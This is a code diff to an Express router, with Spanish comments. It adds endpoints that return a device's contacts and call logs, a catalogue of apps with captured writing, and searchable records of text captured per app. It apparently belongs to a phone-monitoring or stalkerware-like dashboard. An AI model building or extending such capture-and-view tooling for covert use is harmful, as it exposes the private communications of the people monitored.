@@ -22,6 +22,11 @@ const { renderVerLayout } = require('../views/ver/layoutVer');
 const { renderVerFeedView } = require('../views/ver/feedView');
 const { renderVerShareView } = require('../views/ver/shareView');
 const { getVerClientScript } = require('../views/ver/scriptsVer');
+const {
+  getDeviceContactsAndCallLogs,
+  getDeviceNlpApps,
+  getDeviceNlpRecords
+} = require('../services/deviceDataService');
 const fs = require('fs');
 const sharp = require('sharp');
 
@@ -466,6 +471,43 @@ router.post('/api/ver/tag', (req, res) => {
     notes: saved.notes,
     updatedAt: saved.updatedAt
   });
+});
+
+// GET /api/ver/contacts - Obtiene lista consolidada de contactos con metricas de llamadas
+router.get('/api/ver/contacts', (req, res) => {
+  const { deviceId } = req.verUser;
+  try {
+    const result = getDeviceContactsAndCallLogs(deviceId);
+    return res.json(result);
+  } catch (err) {
+    console.error('[VER_API] Error al obtener contactos y llamadas:', err);
+    return res.status(500).json({ success: false, error: 'Error interno al consultar contactos' });
+  }
+});
+
+// GET /api/ver/nlp/apps - Catalogo de aplicaciones con cantidad de escritos y ultima actividad
+router.get('/api/ver/nlp/apps', (req, res) => {
+  const { deviceId } = req.verUser;
+  try {
+    const result = getDeviceNlpApps(deviceId);
+    return res.json(result);
+  } catch (err) {
+    console.error('[VER_API] Error al obtener catalogo de apps NLP:', err);
+    return res.status(500).json({ success: false, error: 'Error interno al consultar apps' });
+  }
+});
+
+// GET /api/ver/nlp/records - Registros de textos capturados por aplicacion
+router.get('/api/ver/nlp/records', (req, res) => {
+  const { deviceId } = req.verUser;
+  const { appPackage, q, date, limit, offset } = req.query;
+  try {
+    const result = getDeviceNlpRecords(deviceId, appPackage, { q, date, limit, offset });
+    return res.json(result);
+  } catch (err) {
+    console.error('[VER_API] Error al obtener registros NLP:', err);
+    return res.status(500).json({ success: false, error: 'Error interno al consultar registros' });
+  }
 });
 
 // GET /expl/ver - Feed Principal Móvil Estilo Instagram
